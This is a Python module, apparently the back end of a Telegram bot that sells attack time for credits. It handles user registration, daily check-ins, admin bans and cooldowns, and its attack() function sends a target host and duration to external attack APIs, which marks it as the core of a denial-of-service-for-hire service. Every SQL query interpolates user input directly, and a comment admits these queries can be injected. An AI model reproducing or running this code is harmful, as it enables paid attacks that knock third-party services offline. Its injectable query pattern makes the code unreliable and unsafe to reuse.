import sqlite3
import datetime
import re
import requests
from Config import config
admin_id = config.TELEGRAM.admin_id

class BotDatabase:
    def dict_factory(self, cursor, row):
        d = {}
        for idx, col in enumerate(cursor.description):
            d[col[0]] = row[idx]
        return d

    def __init__(self, database_file): # 连接数据库
        conn = sqlite3.connect(database_file)
        conn.row_factory = self.dict_factory
        curser = conn.cursor()
        self.conn = conn
        self.curser = curser

    def check_user_status(self, telegram_id):
        search_sql = f"SELECT COUNT(*) FROM user WHERE telegram_id = {telegram_id};"
        result = self.curser.execute(search_sql)
        if (result.fetchone()["COUNT(*)"] != 0):
            search_sql = f"SELECT banned FROM user WHERE telegram_id = {telegram_id};"
            result = self.curser.execute(search_sql)
            if (result.fetchone()["banned"] == 0):
                return True
            else:
                return False
        else:
            return False

    def register(self, telegram_id, register_time):
        search_sql = f"SELECT COUNT(*) FROM user WHERE telegram_id = {telegram_id};"
        result = self.curser.execute(search_sql)
        if (result.fetchone()["COUNT(*)"] == 0):
            register_sql = f"INSERT INTO user VALUES (NULL, {telegram_id}, 0, 60, {register_time}, 0, 0, 0);"
            self.curser.execute(register_sql)
            self.conn.commit()
            return True
        else:
            return False

    def checkin(self, telegram_id):
        if (self.check_user_status(telegram_id)):
            search_sql = f"SELECT last_signed_time FROM user WHERE telegram_id = {telegram_id}"
            result = self.curser.execute(search_sql)
            last_signed_time = result.fetchone()["last_signed_time"]
            utc_time = datetime.datetime.utcfromtimestamp(last_signed_time)
            utc8_time = utc_time + datetime.timedelta(hours=8)
            current_time = datetime.datetime.utcnow() + datetime.timedelta(hours=8)
            if utc8_time.date() != current_time.date():
                current_timestamp = int(datetime.datetime.now().timestamp())
                sign_sql = f"UPDATE user SET last_signed_time = {current_timestamp} WHERE telegram_id = {telegram_id}"
                self.curser.execute(sign_sql)
                credit_sql = f"UPDATE user SET credit = credit + 120 WHERE telegram_id = {telegram_id}"
                self.curser.execute(credit_sql)
                self.conn.commit()
                return ('''*🎉签到成功🎉*\n您的积分已增加 120 点''')
            else:
                return ('''*🚫签到失败🚫*\n一天只能签到一次哦''')
        else:
            return "未注册或被封禁用户"

    def search_user_info(self, telegram_id):
        if (self.check_user_status(telegram_id)):
            search_sql = f"SELECT credit, last_signed_time FROM user WHERE telegram_id = {telegram_id}"
            result = self.curser.execute(search_sql)
            res = result.fetchone()
            credit = res["credit"]
            last_signed_time = res["last_signed_time"]
            utc_time = datetime.datetime.utcfromtimestamp(last_signed_time)
            utc8_time = utc_time + datetime.timedelta(hours=8)
            formatted_time = utc8_time.strftime("%Y\\-%m\\-%d %H:%M:%S")
            return credit, formatted_time
        else:
            return -1, -1

    def admin_ban_user(self, telegram_id, user_id):
        if (telegram_id == admin_id):
            if (self.check_user_status(user_id)):
                ban_sql = f"UPDATE user SET banned = 1 WHERE telegram_id = {user_id}"
                self.curser.execute(ban_sql)
                self.conn.commit()
                return True
            else:
                return False
        else:
            return False

    def admin_set_credit(self, telegram_id, user_id, credit):
        if (telegram_id == admin_id):
            if (self.check_user_status(user_id)):
                ban_sql = f"UPDATE user SET credit = {credit} WHERE telegram_id = {user_id}"
                self.curser.execute(ban_sql)
                self.conn.commit()
                return True
            else:
                return False
        else:
            return False

    def admin_set_cooldown(self, telegram_id, user_id, cooldown):
        if (telegram_id == admin_id):
            if (self.check_user_status(user_id)):
                ban_sql = f"UPDATE user SET cooldown = {cooldown} WHERE telegram_id = {user_id}"
                self.curser.execute(ban_sql)
                self.conn.commit()
                return True
            else:
                return False
        else:
            return False

    def get_methods(self):
        search_sql = f"SELECT name, description, visible FROM method"
        result = self.curser.execute(search_sql)
        methods = result.fetchall()
        response = "⚡️Methods⚡\n\n️"
        for method in methods:
            name = method['name']
            description = method['description']
            visible = method['visible']
            if visible == 1:
                this_method_text = f'''`{name}` \\>\\> _{description}_\n'''
            else:
                this_method_text = ""
            response += this_method_text
        return response

    def check_blacklist(self, target):
        def is_string_banned(input_string, banned_list):
            for banned_item in banned_list:
                pattern = re.compile(banned_item, re.IGNORECASE)
                if re.search(pattern, input_string):
                    return False
            return True
        search_sql = f"SELECT keyword FROM blacklist"
        result = self.curser.execute(search_sql)
        keyword_list = []
        keywords = result.fetchall()
        for keyword in keywords:
            keyword_list.append(keyword["keyword"])
        return is_string_banned(target, keyword_list)



    def attack(self, telegram_id, target, port, duration, method):
        response = "*🚫提交失败🚫*\n任务因未知原因提交失败"
        def send_attack(apiurl, target, port, duration, token):
            try:
                data = {
                    "method": "GET",
                    "host": target,
                    "duration": duration,
                    "token": token
                }
                rsp = requests.post(apiurl, json=data)
                rsp = rsp.json()
                if rsp['code'] == 200:
                    response = f"*🎉提交成功🎉*\n🎯目标: " + target.replace('.', '\\.') + f"\n🔌端口: `{port}`\n⏳时间: `{duration}`\n⚙️方法: `{method}`\n⭐️积分消耗: `{duration}`"
                    return response
                elif rsp['code'] == 403 and "executed" in rsp['message']:
                    utc_time = datetime.datetime.utcfromtimestamp(rsp['finish_time'])
                    utc8_time = utc_time + datetime.timedelta(hours=8)
                    formatted_time = utc8_time.strftime("%Y\\-%m\\-%d %H:%M:%S")
                    response = f"*🚫提交失败🚫*\n有任务未完成\n预计可用时间: {formatted_time}"
                    return response
                else:
                    response = f"*🚫提交失败🚫*\n未能提交任务\n原因: {rsp['message']}"
                    return response
            except Exception:
                response = "*🚫提交失败🚫*\n任务因未知原因提交失败"
            return response
        if (self.check_user_status(telegram_id)):
            search_sql = f"SELECT COUNT(*) FROM method WHERE name = '{method}'"
            result = self.curser.execute(search_sql)
            if (int(duration) > int(config.USER.max_attack_duration)):
                response = f"*🚫提交失败🚫*\n超出设置的最大攻击时长: `{config.DATABASE.max_attack_duration}`"
            else:
                if (result.fetchone()["COUNT(*)"] != 0):
                    if(self.check_blacklist(target)):
                        search_sql = f"SELECT api_url, token FROM method WHERE name = '{method}'" # 这个函数所有和method有关的sql语句都可能会被注入 再想办法
                        result = self.curser.execute(search_sql)
                        res = result.fetchone()
                        apiurl = res["api_url"]
                        token = res["token"]
                        search_sql = f"SELECT credit, last_finish_time, cooldown FROM user WHERE telegram_id = {telegram_id}"
                        result = self.curser.execute(search_sql)
                        res = result.fetchone()
                        credit = res["credit"]
                        last_finish_time = res["last_finish_time"]
                        cooldown = res["cooldown"]
                        current_timestamp = int(datetime.datetime.now().timestamp())
                        time_difference = current_timestamp - last_finish_time
                        if time_difference <= cooldown:
                            finish_timestamp = last_finish_time + cooldown
                            utc_time = datetime.datetime.utcfromtimestamp(finish_timestamp)
                            utc8_time = utc_time + datetime.timedelta(hours=8)
                            formatted_time = utc8_time.strftime("%Y\\-%m\\-%d %H:%M:%S")
                            response = f"*🚫提交失败🚫*\n冷却时间未结束\n结束时间：{formatted_time}"
                            return response
                        if credit < int(duration):
                            response = "*🚫提交失败🚫*\n积分不足"
                            return response
                        else:
                            response = send_attack(apiurl, target, port, duration, token)
                            if "成功" in response:
                                credit_sql = f"UPDATE user SET credit = credit - {int(duration)} WHERE telegram_id = {telegram_id}"
                                self.curser.execute(credit_sql)
                                current_timestamp = int(datetime.datetime.now().timestamp())
                                finish_timestamp = current_timestamp + cooldown
                                cooldown_sql = f"UPDATE user SET last_finish_time = {finish_timestamp} WHERE telegram_id = {telegram_id}"
                                self.curser.execute(cooldown_sql)
                                self.conn.commit()
                            return response
                    else:
                        response = "*🚫提交失败🚫*\n目标命中黑名单"
                else:
                    response = "*🚫提交失败🚫*\n方法不存在"
        else:
            response = "未注册或被封禁用户"
        return response